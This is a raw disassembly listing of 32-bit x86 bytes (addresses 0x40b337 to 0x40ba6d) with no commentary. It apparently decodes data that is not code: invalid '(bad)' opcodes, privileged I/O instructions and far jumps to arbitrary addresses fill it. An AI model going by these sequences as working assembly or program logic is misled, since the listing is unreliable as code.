  40b337:	push   0x64
  40b339:	jmp    ecx
  40b33b:	jge    0x40b31d
  40b33d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b33e:	xor    BYTE PTR [ebx],cl
  40b340:	out    0xc0,eax
  40b342:	test   BYTE PTR [edx+edi*2],dh
  40b345:	add    eax,0x149ed9ef
  40b34a:	sahf   
  40b34b:	in     al,dx
  40b34c:	xchg   DWORD PTR [ebp+0x622cf04d],esi
  40b352:	unpcklps xmm2,XMMWORD PTR [ebx]
  40b355:	xchg   esp,eax
  40b356:	sub    eax,0x8b675fe7
  40b35b:	test   DWORD PTR [edi+ebx*8],esi
  40b35e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b35f:	pop    edi
  40b360:	push   ebx
  40b361:	stc    
  40b362:	pop    ebp
  40b363:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b364:	push   ecx
  40b365:	and    BYTE PTR [esp+ecx*2-0x43],ch
  40b369:	sbb    ch,al
  40b36b:	out    0xe,eax
  40b36d:	xchg   esp,eax
  40b36e:	cwde   
  40b36f:	daa    
  40b370:	lahf   
  40b371:	(bad)  
  40b372:	ror    esp,1
  40b374:	loop   0x40b30e
  40b376:	data16 idiv BYTE PTR [ecx-0x3cbd9f09]
  40b37d:	xor    eax,0x24ce7905
  40b382:	loopne 0x40b34a
  40b384:	jp     0x40b3ed
  40b386:	out    dx,eax
  40b387:	sbb    al,0x11
  40b389:	adc    al,0x10
  40b38b:	sahf   
  40b38c:	fdivr  DWORD PTR [esi]
  40b38e:	je     0x40b3b5
  40b390:	hlt    
  40b391:	xchg   edx,eax
  40b392:	ror    dh,1
  40b394:	pop    ss
  40b395:	sbb    BYTE PTR [ebp+0x70],bh
  40b398:	mov    edx,0x6eb3890c
  40b39d:	(bad)  
  40b39e:	ja     0x40b359
  40b3a0:	pusha  
  40b3a1:	ins    BYTE PTR es:[edi],dx
  40b3a2:	jecxz  0x40b3ab
  40b3a4:	pop    esp
  40b3a5:	lea    ebp,ds:0xf7a068df
  40b3ab:	enter  0x6e1d,0x73
  40b3af:	bnd jge 0x40b36b
  40b3b2:	jnp    0x40b3a5
  40b3b4:	or     al,0xbb
  40b3b6:	and    BYTE PTR [eax+0x3d],dl
  40b3b9:	and    eax,0xf70432e3
  40b3be:	jmp    0x8ac2:0x2977b1ca
  40b3c5:	xchg   edx,eax
  40b3c6:	mov    esi,eax
  40b3c8:	scas   eax,DWORD PTR es:[edi]
  40b3c9:	cli    
  40b3ca:	pop    esi
  40b3cb:	cld    
  40b3cc:	mov    bh,0x34
  40b3ce:	stc    
  40b3cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3d0:	inc    eax
  40b3d1:	adc    al,BYTE PTR [ebp+0x5a]
  40b3d4:	sbb    al,0xea
  40b3d6:	push   esp
  40b3d7:	icebp  
  40b3d8:	test   BYTE PTR [eax+0x4c],ch
  40b3db:	sbb    eax,0x3194ee82
  40b3e0:	ss loop 0x40b3c8
  40b3e3:	pop    ebp
  40b3e4:	dec    esi
  40b3e5:	inc    BYTE PTR [edi-0x17]
  40b3e8:	scas   al,BYTE PTR es:[edi]
  40b3e9:	rol    eax,0x3a
  40b3ec:	fldenv [esi+0x59b2952c]
  40b3f2:	fisub  WORD PTR [ebx]
  40b3f4:	loopne 0x40b395
  40b3f6:	push   ebx
  40b3f7:	sbb    cl,BYTE PTR [ebp-0x63]
  40b3fa:	adc    dh,BYTE PTR [eax+edx*4+0x4cf56cac]
  40b401:	test   BYTE PTR [ecx-0x61708b09],0x78
  40b408:	xchg   ebp,eax
  40b409:	pop    ecx
  40b40a:	out    0x48,al
  40b40c:	add    bl,BYTE PTR [ebx+0x55806620]
  40b412:	rcr    BYTE PTR [eax+0x3efc851a],0x7c
  40b419:	outs   dx,BYTE PTR ds:[esi]
  40b41a:	inc    esi
  40b41b:	aaa    
  40b41c:	aas    
  40b41d:	add    eax,0xdfd42a12
  40b422:	inc    eax
  40b423:	ins    BYTE PTR es:[edi],dx
  40b424:	adc    edi,esp
  40b426:	cwde   
  40b427:	adc    dl,BYTE PTR ds:0xc4e2b669
  40b42d:	push   esi
  40b42e:	loop   0x40b4a9
  40b430:	xor    eax,0x3deb0b19
  40b435:	mov    esi,0x4512791d
  40b43a:	sbb    dl,BYTE PTR [esp+edi*4]
  40b43d:	out    dx,eax
  40b43e:	out    dx,eax
  40b43f:	cmp    ebp,esi
  40b441:	addr16 mov ebx,0x287fad19
  40b447:	into   
  40b448:	addr16 retw 0x46e9
  40b44d:	sub    eax,0xaf170d50
  40b452:	or     ebp,DWORD PTR [ecx+0x46]
  40b455:	dec    esp
  40b456:	pop    esp
  40b457:	outs   dx,DWORD PTR ds:[esi]
  40b458:	push   eax
  40b459:	push   ss
  40b45a:	inc    ecx
  40b45b:	pop    ebp
  40b45c:	std    
  40b45d:	sbb    eax,0x6c34e2fb
  40b462:	and    DWORD PTR [ebp+0x36],esp
  40b465:	sub    al,0x34
  40b467:	add    BYTE PTR [ebx+0x708a242f],bh
  40b46d:	mov    bl,0xb7
  40b46f:	adc    esp,DWORD PTR [ecx-0x558685de]
  40b475:	scas   al,BYTE PTR es:[edi]
  40b476:	pop    ebp
  40b477:	xlat   BYTE PTR ds:[ebx]
  40b478:	xlat   BYTE PTR ds:[ebx]
  40b479:	jnp    0x40b427
  40b47b:	(bad)  
  40b47c:	and    dl,BYTE PTR [eiz*1-0x3424015b]
  40b483:	jg     0x40b4f2
  40b485:	into   
  40b486:	mov    dh,ah
  40b488:	adc    bl,BYTE PTR [esi+0x73]
  40b48b:	sub    dl,al
  40b48d:	popf   
  40b48e:	jae    0x40b49e
  40b490:	mov    bh,0x14
  40b492:	adc    bh,ch
  40b494:	sti    
  40b495:	dec    esi
  40b496:	pop    ss
  40b497:	imul   eax,DWORD PTR [ecx],0x48
  40b49a:	(bad)  
  40b49b:	clc    
  40b49c:	out    0xf2,eax
  40b49e:	push   ebx
  40b49f:	and    BYTE PTR ds:0x3fddc39f,0xfa
  40b4a6:	test   BYTE PTR [ebp-0x45],dl
  40b4a9:	adc    al,0xb5
  40b4ab:	mov    al,ds:0xaefdb13c
  40b4b0:	loop   0x40b493
  40b4b2:	mov    ebx,DWORD PTR [ecx+0x6d]
  40b4b5:	js     0x40b52b
  40b4b7:	dec    esp
  40b4b8:	stos   BYTE PTR es:[edi],al
  40b4b9:	ret    
  40b4ba:	jb     0x40b4ed
  40b4bc:	mov    esi,0x11e26f0d
  40b4c1:	sbb    DWORD PTR [ebx],0x769a8e34
  40b4c7:	push   0x60
  40b4c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4ca:	outs   dx,DWORD PTR ds:[esi]
  40b4cb:	(bad)  
  40b4cc:	cmp    al,0xb3
  40b4ce:	xchg   edi,eax
  40b4cf:	xor    al,BYTE PTR [ebx-0x75]
  40b4d2:	stos   DWORD PTR es:[edi],eax
  40b4d3:	je     0x40b534
  40b4d5:	pop    esi
  40b4d6:	mov    ds:0xeb71cde0,al
  40b4db:	push   edx
  40b4dc:	sub    al,0xf6
  40b4de:	and    eax,0x2c9259d9
  40b4e3:	outs   dx,BYTE PTR ds:[esi]
  40b4e4:	jns    0x40b4ad
  40b4e6:	in     al,dx
  40b4e7:	(bad)
  40b4ea:	loopne 0x40b557
  40b4ec:	sbb    al,0x8f
  40b4ee:	inc    edx
  40b4ef:	(bad)  
  40b4f0:	or     DWORD PTR [edx-0x1b],eax
  40b4f3:	pop    ss
  40b4f4:	shl    BYTE PTR [edi-0xa],1
  40b4f7:	inc    ebx
  40b4f8:	and    esi,0x7c34ddd8
  40b4fe:	dec    edi
  40b4ff:	cmp    BYTE PTR [ebx+0x30e82108],0xd8
  40b506:	adc    DWORD PTR [edx+0x41fcec42],ebx
  40b50c:	dec    edx
  40b50d:	xchg   ebx,eax
  40b50e:	sbb    DWORD PTR [edi+ebx*8-0x4f],eax
  40b512:	in     al,dx
  40b513:	cmp    DWORD PTR [esi-0x5b],0xdd804d8a
  40b51a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b51b:	into   
  40b51c:	into   
  40b51d:	stos   DWORD PTR es:[edi],eax
  40b51e:	or     dh,ch
  40b520:	or     DWORD PTR [ebx],0x4272a94
  40b526:	inc    esi
  40b527:	pop    eax
  40b528:	ret    0xafe7
  40b52b:	jmp    0xb538e608
  40b530:	loop   0x40b501
  40b532:	mov    cl,0xaa
  40b534:	stos   BYTE PTR es:[edi],al
  40b535:	add    eax,0xcbe75f4c
  40b53a:	(bad)  
  40b53b:	push   ds
  40b53c:	dec    ebp
  40b53d:	lahf   
  40b53e:	out    0x44,al
  40b540:	(bad)  
  40b541:	scas   eax,DWORD PTR es:[edi]
  40b542:	push   ecx
  40b543:	or     edx,DWORD PTR [ebx]
  40b545:	push   ebx
  40b546:	pop    ecx
  40b547:	inc    ecx
  40b548:	push   ecx
  40b549:	neg    DWORD PTR [bx+di-0x6c]
  40b54d:	sub    ebp,DWORD PTR ds:[ecx+0x5a]
  40b551:	aaa    
  40b552:	outs   dx,BYTE PTR ds:[esi]
  40b553:	mov    ebp,0x5e2a43a9
  40b558:	push   ss
  40b559:	add    ch,BYTE PTR [esi-0x50]
  40b55c:	test   esp,ebx
  40b55e:	outs   dx,DWORD PTR ds:[esi]
  40b55f:	jns    0x40b4ea
  40b561:	adc    dl,BYTE PTR [edi-0x311053ac]
  40b567:	sar    BYTE PTR gs:[eax-0x22],1
  40b56b:	scas   al,BYTE PTR es:[edi]
  40b56c:	inc    esp
  40b56d:	das    
  40b56e:	cmp    edi,DWORD PTR [eax+0x3c]
  40b571:	inc    ebp
  40b572:	xor    BYTE PTR [ebp+edx*4+0x26],bh
  40b576:	dec    edx
  40b577:	cmp    edx,DWORD PTR [eax]
  40b579:	das    
  40b57a:	sbb    ebp,eax
  40b57c:	push   ss
  40b57d:	(bad)  
  40b57e:	cmp    ebp,DWORD PTR [edx+eax*8-0x69]
  40b582:	pop    es
  40b583:	pop    es
  40b584:	daa    
  40b585:	mov    ds:0x77e928d,al
  40b58a:	jnp    0x40b52a
  40b58c:	cdq    
  40b58d:	or     eax,eax
  40b58f:	or     DWORD PTR [ebx],ebp
  40b591:	retf   0x6a0c
  40b594:	dec    esp
  40b595:	fs inc eax
  40b597:	mov    esp,0x3c886116
  40b59c:	loopne 0x40b5d0
  40b59e:	or     esp,eax
  40b5a0:	jge    0x40b5e0
  40b5a2:	(bad)  
  40b5a3:	mov    al,ds:0x6d8bdd47
  40b5a8:	shl    dl,1
  40b5aa:	sub    al,0xb5
  40b5ac:	(bad)  
  40b5ad:	fnstsw WORD PTR [edi]
  40b5af:	xchg   ebp,eax
  40b5b0:	push   edx
  40b5b1:	ret    0x383e
  40b5b4:	jb     0x40b5e1
  40b5b6:	adc    BYTE PTR [edx],dh
  40b5b8:	outs   dx,BYTE PTR ds:[esi]
  40b5b9:	jne    0x40b567
  40b5bb:	lock xchg al,al
  40b5be:	sbb    ah,BYTE PTR [eax+0x4d]
  40b5c1:	mov    ds:0x4b03b80c,eax
  40b5c6:	ss addr16 retfw 0xff7d
  40b5cc:	imul   ebp,DWORD PTR [ecx+eax*1],0x90459050
  40b5d3:	clc    
  40b5d4:	dec    ecx
  40b5d5:	cdq    
  40b5d6:	loopne 0x40b56f
  40b5d8:	stos   DWORD PTR es:[edi],eax
  40b5d9:	cmp    DWORD PTR [ebx-0x64],ebx
  40b5dc:	addr16 xchg esp,eax
  40b5de:	xchg   esi,eax
  40b5df:	lock fs jge 0x40b5c8
  40b5e3:	loop   0x40b5e0
  40b5e5:	lods   eax,DWORD PTR ds:[esi]
  40b5e6:	mov    edi,0x2251afa3
  40b5eb:	sbb    ebp,0x635f1632
  40b5f1:	scas   eax,DWORD PTR es:[edi]
  40b5f2:	or     ah,dh
  40b5f4:	lds    edx,FWORD PTR [ebp-0x27]
  40b5f7:	jno    0x40b5e0
  40b5f9:	jecxz  0x40b64f
  40b5fb:	cmp    ch,BYTE PTR [edi]
  40b5fd:	add    DWORD PTR [edi-0x1ab74a43],ebp
  40b603:	hlt    
  40b604:	pop    esp
  40b605:	test   BYTE PTR [ebx+0x28],dl
  40b608:	test   ah,cl
  40b60a:	cmp    BYTE PTR [edi-0x75],0x53
  40b60e:	ror    DWORD PTR [edx-0x4291c7],0x29
  40b615:	gs scas al,BYTE PTR es:[edi]
  40b617:	pop    eax
  40b618:	mov    dl,0x7
  40b61a:	sbb    DWORD PTR [esi-0x6c],edi
  40b61d:	lods   eax,DWORD PTR ds:[esi]
  40b61e:	clc    
  40b61f:	mov    eax,0x9ca4c46d
  40b624:	pop    es
  40b625:	fs xor cl,bl
  40b628:	mov    bh,0xd6
  40b62a:	pop    ds
  40b62b:	dec    ebx
  40b62c:	sub    al,0x2b
  40b62e:	lea    esi,[ecx-0x18]
  40b631:	cmc    
  40b632:	push   eax
  40b633:	cwde   
  40b634:	enter  0x98c6,0x90
  40b638:	dec    ebx
  40b639:	(bad)  
  40b63a:	mov    edx,0x36306c80
  40b63f:	jecxz  0x40b60e
  40b641:	les    edx,FWORD PTR [ebx-0x51]
  40b644:	inc    ebx
  40b645:	fwait
  40b646:	mov    ch,0xba
  40b648:	pop    edx
  40b649:	mov    fs,WORD PTR [ebx+0x14]
  40b64c:	iret   
  40b64d:	std    
  40b64e:	inc    esi
  40b64f:	xor    al,0xf6
  40b651:	pushf  
  40b652:	out    0x1,eax
  40b654:	mov    ds:0x2742f49,al
  40b659:	(bad)  
  40b65a:	cwde   
  40b65b:	rcl    BYTE PTR fs:[esi],cl
  40b65e:	in     eax,dx
  40b65f:	mov    dh,0x6b
  40b661:	pop    esp
  40b662:	pop    ebp
  40b663:	jno    0x40b67d
  40b665:	sbb    ecx,DWORD PTR [edi]
  40b667:	mov    ebp,0x6a8ff96a
  40b66c:	enter  0x4d58,0x7
  40b670:	aad    0xf4
  40b672:	arpl   WORD PTR [esi-0x54],sp
  40b675:	or     ebp,DWORD PTR [eax+0x18608e72]
  40b67b:	std    
  40b67c:	push   esi
  40b67d:	data16 or al,0xfd
  40b680:	add    al,0x63
  40b682:	(bad)  
  40b684:	je     0x40b6b6
  40b686:	push   esp
  40b687:	jnp    0x40b67a
  40b689:	xor    esp,DWORD PTR [eax+0x27]
  40b68c:	dec    esp
  40b68d:	xchg   edx,eax
  40b68e:	xchg   esp,eax
  40b68f:	pop    ecx
  40b690:	sub    dl,BYTE PTR [edx+ebp*4-0x1d]
  40b694:	in     eax,dx
  40b695:	jb     0x40b635
  40b697:	jo     0x40b716
  40b699:	popf   
  40b69a:	or     BYTE PTR [esi+0x68],al
  40b69d:	test   al,0xc8
  40b69f:	enter  0x421d,0xc3
  40b6a3:	adc    BYTE PTR [esi],bl
  40b6a5:	mov    DWORD PTR [eax-0x3654b2a2],eax
  40b6ab:	push   ds
  40b6ac:	sub    DWORD PTR [edx],ecx
  40b6ae:	adc    esi,esp
  40b6b0:	xchg   esi,eax
  40b6b1:	push   edx
  40b6b2:	inc    ecx
  40b6b3:	add    BYTE PTR [ecx+eiz*4-0x67],ch
  40b6b7:	sub    eax,0x4e41366c
  40b6bc:	scas   al,BYTE PTR es:[edi]
  40b6bd:	bound  edx,QWORD PTR [edi]
  40b6bf:	jb     0x40b712
  40b6c1:	addr16 inc ebx
  40b6c3:	jo     0x40b672
  40b6c5:	dec    edx
  40b6c6:	ret    
  40b6c7:	daa    
  40b6c8:	mov    ecx,0x6199e130
  40b6cd:	push   esp
  40b6ce:	jo     0x40b6da
  40b6d0:	push   ebx
  40b6d1:	jge    0x40b6d5
  40b6d3:	in     al,dx
  40b6d4:	sub    al,0xe1
  40b6d6:	jl     0x40b74b
  40b6d8:	inc    ecx
  40b6d9:	sbb    DWORD PTR [eax-0x6f],eax
  40b6dc:	bound  esi,QWORD PTR [esi]
  40b6de:	add    BYTE PTR [ebp-0x5385546b],al
  40b6e4:	mov    ds:0x8e35bcf3,eax
  40b6e9:	cmp    bh,dh
  40b6eb:	repnz inc esp
  40b6ed:	fidiv  WORD PTR [ebx+0x36]
  40b6f0:	pop    ecx
  40b6f1:	ror    ebx,cl
  40b6f3:	xchg   BYTE PTR [edx-0xabf5727],ch
  40b6f9:	mov    es,WORD PTR [ebx+0x2d]
  40b6fc:	sbb    BYTE PTR [edi-0x323b893d],cl
  40b702:	imul   edi,DWORD PTR [ebx-0xd88c16],0x57a67c26
  40b70c:	mov    gs,WORD PTR [eax]
  40b70e:	fsubr  DWORD PTR [eax+eiz*2-0x26]
  40b712:	and    BYTE PTR [esi+0x20],al
  40b715:	push   ds
  40b716:	repz pop ss
  40b718:	call   0x9b92cd35
  40b71d:	fcom   DWORD PTR [edi-0x2fb54ee3]
  40b723:	fisub  DWORD PTR [edx-0x6d]
  40b726:	xchg   BYTE PTR [eax],ch
  40b728:	(bad)  
  40b729:	jmp    eax
  40b72b:	xor    cl,BYTE PTR [esi-0x5d]
  40b72e:	dec    esp
  40b72f:	sub    bh,BYTE PTR [ecx+0x3ebd8435]
  40b735:	push   edx
  40b736:	imul   ebx,DWORD PTR [esi-0x15584082],0x2759036d
  40b740:	mov    edi,0xbecc3f38
  40b745:	mov    eax,edx
  40b747:	pushw  0x95c7
  40b74b:	mov    ebx,0xced2accd
  40b750:	mov    esi,0xf420a3d4
  40b755:	stc    
  40b756:	dec    edi
  40b757:	iret   
  40b758:	push   edx
  40b759:	std    
  40b75a:	lds    ebp,FWORD PTR ds:[edi]
  40b75d:	scas   eax,DWORD PTR es:[edi]
  40b75e:	cmp    ebx,esi
  40b760:	jno    0x40b720
  40b762:	mov    bl,0x16
  40b764:	pop    esi
  40b765:	mov    WORD PTR [eax-0x18293c86],ss
  40b76b:	mov    al,0xd
  40b76d:	xchg   ebx,eax
  40b76e:	call   0x84a290ac
  40b773:	out    dx,al
  40b774:	test   eax,edx
  40b776:	mov    edi,0x8ee46fb1
  40b77b:	add    dh,dh
  40b77d:	lahf   
  40b77e:	and    al,0x9b
  40b781:	pop    ss
  40b782:	jge    0x40b7c1
  40b784:	dec    ebx
  40b785:	cld    
  40b786:	and    eax,0x17303b7f
  40b78b:	mov    edx,0x2ca9d3d6
  40b790:	daa    
  40b791:	(bad)  
  40b792:	ds push 0x5a
  40b795:	rcr    ah,1
  40b797:	int3   
  40b798:	jb     0x40b72b
  40b79a:	pop    eax
  40b79b:	push   0x1d837d8a
  40b7a0:	and    al,BYTE PTR [ebp-0x6c]
  40b7a3:	in     al,dx
  40b7a4:	sub    ch,BYTE PTR [edi-0x1]
  40b7a7:	ss pop esi
  40b7a9:	and    eax,0x63ff0f1c
  40b7ae:	fldenv ds:0x324476f
  40b7b4:	adc    edi,DWORD PTR [eax-0x7ebc6877]
  40b7ba:	jge    0x40b835
  40b7bc:	jne    0x40b838
  40b7be:	pop    ss
  40b7bf:	adc    eax,0x4ee76ab3
  40b7c4:	ror    edi,cl
  40b7c6:	lods   al,BYTE PTR ds:[esi]
  40b7c7:	test   al,0xcd
  40b7c9:	sbb    dh,ah
  40b7cb:	pop    ecx
  40b7cc:	mov    dh,0x48
  40b7ce:	out    dx,eax
  40b7cf:	and    dh,BYTE PTR [eax-0x645571f7]
  40b7d5:	push   eax
  40b7d6:	xchg   esp,eax
  40b7d7:	inc    ebx
  40b7d8:	adc    al,0x70
  40b7da:	(bad)  
  40b7db:	(bad)  
  40b7dc:	out    0xa9,eax
  40b7de:	fsub   DWORD PTR [edi+0x75b2e7d4]
  40b7e4:	popf   
  40b7e5:	aad    0xe1
  40b7e7:	or     dl,BYTE PTR [ebx-0x5e]
  40b7ea:	push   es
  40b7eb:	ds (bad) 
  40b7ed:	out    0xdd,al
  40b7ef:	xchg   ebp,eax
  40b7f0:	add    dl,bl
  40b7f2:	mov    bh,0x99
  40b7f4:	sbb    ebx,esp
  40b7f6:	jmp    FWORD PTR [edx-0x21]
  40b7f9:	js     0x40b7b3
  40b7fb:	dec    ebp
  40b7fc:	loop   0x40b7d7
  40b7fe:	jbe    0x40b835
  40b800:	jmp    0x8eb5a1fa
  40b805:	int3   
  40b806:	test   eax,0xffd14ed6
  40b80b:	cdq    
  40b80c:	mov    edi,0x2793741d
  40b811:	sbb    ecx,DWORD PTR [eax]
  40b813:	push   0x27
  40b815:	pop    edi
  40b816:	adc    al,bh
  40b818:	test   eax,0xbb7aa1a9
  40b81d:	and    eax,0xd91d6079
  40b822:	sbb    ebx,DWORD PTR [edi]
  40b824:	or     edi,esp
  40b826:	(bad)  
  40b827:	cmp    eax,DWORD PTR [edx-0x65]
  40b82a:	sbb    DWORD PTR [eax],edx
  40b82c:	cli    
  40b82d:	mov    bh,0xb
  40b82f:	jecxz  0x40b845
  40b831:	ficom  DWORD PTR [esi+eax*4+0x4c9890ff]
  40b838:	in     al,dx
  40b839:	out    0xba,eax
  40b83b:	xchg   esp,eax
  40b83c:	mov    ch,0x97
  40b83e:	enter  0x8429,0x57
  40b842:	retf   0xc7fc
  40b845:	ins    DWORD PTR es:[edi],dx
  40b846:	(bad)  [edx-0x5afcd0fa]
  40b84c:	push   ss
  40b84d:	sbb    al,ah
  40b84f:	ret    
  40b850:	icebp  
  40b851:	loopne 0x40b82b
  40b853:	and    ah,dl
  40b855:	mov    esi,0x35624c37
  40b85a:	pushf  
  40b85b:	xchg   ecx,eax
  40b85c:	cmp    eax,0x9f2d50bb
  40b861:	xchg   BYTE PTR [ecx-0x5f],dh
  40b864:	xchg   ecx,eax
  40b865:	mov    BYTE PTR [ebx+0xb078b78],bl
  40b86b:	test   eax,0x462a499
  40b870:	push   es
  40b871:	shl    DWORD PTR [ecx+0x49],cl
  40b874:	je     0x40b895
  40b876:	rcr    esi,cl
  40b878:	dec    ebx
  40b879:	sbb    ebp,DWORD PTR [esi]
  40b87b:	xchg   ebx,eax
  40b87c:	pop    es
  40b87d:	ss pop ss
  40b87f:	pop    esp
  40b880:	cmp    DWORD PTR [edi-0x4979efe9],esp
  40b886:	cmp    al,0x84
  40b888:	popa   
  40b889:	cld    
  40b88a:	fdiv   st,st(1)
  40b88c:	ret    
  40b88d:	sub    cl,BYTE PTR [eax+eax*4-0x4c3a678a]
  40b894:	mov    bh,0xae
  40b896:	neg    BYTE PTR [edx]
  40b898:	push   ebp
  40b899:	jo     0x40b897
  40b89b:	rcr    DWORD PTR [ebx+ecx*4+0x2e350ada],1
  40b8a2:	inc    edx
  40b8a3:	test   ah,0x31
  40b8a6:	leave  
  40b8a7:	std    
  40b8a8:	addr16 inc esp
  40b8aa:	push   esi
  40b8ab:	fnsave [edi+0x55]
  40b8ae:	push   0x26ab168b
  40b8b3:	xchg   esi,eax
  40b8b4:	cmc    
  40b8b5:	mov    ds:0x4ee3130c,eax
  40b8ba:	aas    
  40b8bb:	mov    al,ds:0x2103f183
  40b8c0:	sahf   
  40b8c1:	push   edi
  40b8c2:	pand   mm1,mm0
  40b8c5:	ror    DWORD PTR [edi],0xdb
  40b8c8:	test   DWORD PTR [edi+0x42],ebp
  40b8cb:	sub    ch,bl
  40b8cd:	sub    al,0xc3
  40b8cf:	lods   eax,DWORD PTR ds:[esi]
  40b8d0:	dec    esp
  40b8d1:	cld    
  40b8d2:	push   eax
  40b8d3:	pop    edx
  40b8d4:	(bad)  
  40b8d5:	lods   al,BYTE PTR ds:[esi]
  40b8d6:	ss inc ebp
  40b8d8:	add    eax,0x77c30cf0
  40b8dd:	fyl2xp1 
  40b8df:	adc    esi,DWORD PTR [ebx-0xcbae756]
  40b8e5:	ins    BYTE PTR es:[edi],dx
  40b8e6:	sbb    eax,0x52f7572c
  40b8eb:	jnp    0x40b943
  40b8ed:	(bad)  
  40b8ee:	std    
  40b8ef:	call   0x6db:0xd9ca230d
  40b8f6:	xor    cl,BYTE PTR [ecx+0x64]
  40b8f9:	add    cl,BYTE PTR [ebp-0x32a4eba4]
  40b8ff:	(bad)  
  40b900:	aas    
  40b901:	mov    bl,0xac
  40b903:	test   edx,eax
  40b905:	out    0xce,eax
  40b907:	or     BYTE PTR [edi+0x4e],dh
  40b90a:	sub    edx,esi
  40b90c:	pop    eax
  40b90d:	xor    al,BYTE PTR [ebx+0x42]
  40b910:	jl     0x40b94f
  40b912:	inc    esi
  40b913:	ins    DWORD PTR es:[edi],dx
  40b914:	(bad)  
  40b915:	into   
  40b916:	lahf   
  40b917:	nop
  40b918:	inc    eax
  40b919:	inc    eax
  40b91a:	imul   esi,DWORD PTR ds:0x94438479,0xc285685d
  40b924:	ror    BYTE PTR [edi-0x2827c55],0x25
  40b92b:	loopne 0x40b8b8
  40b92d:	imul   ebx,esp,0x47
  40b930:	dec    ebp
  40b931:	jmp    0x40b910
  40b933:	add    DWORD PTR [ebp-0x24df580e],ecx
  40b939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b93a:	inc    eax
  40b93b:	adc    DWORD PTR [eax+0x3e],edi
  40b93e:	adc    DWORD PTR [edi+0x4d],edx
  40b941:	dec    esp
  40b942:	push   esp
  40b943:	pop    esi
  40b944:	shr    DWORD PTR [edi+0x7e],cl
  40b947:	repz popa 
  40b949:	xchg   DWORD PTR [edi-0x5a],ecx
  40b94c:	push   cs
  40b94d:	cmp    eax,0xa4d257a
  40b952:	scas   al,BYTE PTR es:[edi]
  40b953:	scas   al,BYTE PTR es:[edi]
  40b954:	mov    BYTE PTR [ebx-0x13a21dc6],ch
  40b95a:	fwait
  40b95b:	repnz mov esp,0xc7a37b9f
  40b961:	push   eax
  40b962:	scas   eax,DWORD PTR es:[edi]
  40b963:	(bad)  [esi]
  40b965:	clc    
  40b966:	sub    al,0x98
  40b968:	stos   BYTE PTR es:[edi],al
  40b969:	add    DWORD PTR [esi],0xffffffe6
  40b96c:	cmovle esi,DWORD PTR [ebp-0x7f17a55e]
  40b973:	sub    BYTE PTR [eax],dl
  40b975:	jae    0x40b978
  40b977:	xchg   si,ax
  40b979:	or     bh,BYTE PTR [edx-0x7a]
  40b97c:	inc    edx
  40b97d:	and    eax,0x27f8a385
  40b982:	mov    ebx,0xfa85cfe8
  40b987:	xchg   edi,eax
  40b988:	xor    bl,BYTE PTR [edi+0x6257e6e]
  40b98e:	add    DWORD PTR [edi+0x433e1113],edi
  40b994:	inc    esp
  40b995:	mov    edx,0xa8cb3137
  40b99a:	add    al,0xaf
  40b99c:	les    ebp,FWORD PTR [ecx+0xb]
  40b99f:	fisttp DWORD PTR [edi-0x6d8ea9b9]
  40b9a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9a7:	call   0xf5cf:0x401812b6
  40b9ae:	push   edi
  40b9af:	repz mov eax,ds:0xa7c6854
  40b9b5:	and    eax,0x3b594a9e
  40b9ba:	push   edx
  40b9bb:	pop    ss
  40b9bc:	nop
  40b9bd:	(bad)  
  40b9be:	dec    edi
  40b9bf:	inc    ebx
  40b9c0:	push   cs
  40b9c1:	imul   ecx,ebx,0x16
  40b9c4:	add    bh,BYTE PTR ds:[edi+0x3]
  40b9c8:	pop    ss
  40b9c9:	pop    eax
  40b9ca:	lods   al,BYTE PTR ds:[esi]
  40b9cb:	cmp    BYTE PTR [ebx-0x71ac4f33],al
  40b9d1:	fcomp  DWORD PTR [esi-0x79]
  40b9d4:	xor    dl,BYTE PTR es:[edx+0xc]
  40b9d8:	mov    ebx,0x4b7c8fab
  40b9dd:	sti    
  40b9de:	jmp    0xf8538634
  40b9e3:	fisttp QWORD PTR [ebp+0x6bd4e347]
  40b9e9:	loopne 0x40ba00
  40b9eb:	mov    ebp,0x22e5feaf
  40b9f0:	xor    edi,eax
  40b9f2:	(bad)  
  40b9f3:	stos   DWORD PTR es:[edi],eax
  40b9f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9f5:	sar    DWORD PTR [edi-0x1c379627],1
  40b9fb:	cmp    esi,DWORD PTR [ebx-0x22]
  40b9fe:	outs   dx,BYTE PTR ds:[esi]
  40b9ff:	(bad)  
  40ba00:	add    ecx,ebp
  40ba02:	jbe    0x40ba06
  40ba04:	mov    ds:0x897d061a,eax
  40ba09:	xchg   edi,eax
  40ba0a:	sub    al,0x14
  40ba0c:	push   es
  40ba0d:	lock dec ebp
  40ba0f:	sbb    BYTE PTR [edi-0x60],bl
  40ba12:	dec    edi
  40ba13:	shr    DWORD PTR [edi+ebp*4],0xf6
  40ba17:	rol    DWORD PTR [edx-0x51],1
  40ba1a:	or     ebx,DWORD PTR [ebx]
  40ba1c:	fld    TBYTE PTR [edi-0x4d8342ce]
  40ba22:	das    
  40ba23:	pop    ebx
  40ba24:	sub    DWORD PTR [ecx-0x76440d0a],esp
  40ba2a:	(bad)  
  40ba2b:	ja     0x40ba60
  40ba2d:	jmp    0x40ba9f
  40ba2f:	mov    cl,0x9d
  40ba31:	jb     0x40ba8e
  40ba33:	jb     0x40ba0e
  40ba35:	push   edi
  40ba36:	push   esi
  40ba37:	push   ecx
  40ba38:	aad    0xb7
  40ba3a:	adc    DWORD PTR [edx],0xdecc5458
  40ba40:	mov    DWORD PTR [edx-0xf],0x79cb0562
  40ba47:	inc    esi
  40ba48:	mov    dl,0xef
  40ba4a:	push   0xffffff8d
  40ba4c:	sbb    eax,0xd3804c88
  40ba51:	test   edx,ebp
  40ba53:	gs mov eax,0x5a28a1a9
  40ba59:	dec    esi
  40ba5a:	pop    ecx
  40ba5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba5c:	mov    esi,0x152d7d6
  40ba61:	sub    bl,ah
  40ba63:	int    0x8e
  40ba65:	jbe    0x40bae0
  40ba67:	jbe    0x40bae2
  40ba69:	xchg   esp,eax
  40ba6a:	push   ds
  40ba6b:	sbb    al,0x75
  40ba6d:	jmp    DWORD PTR [esi]
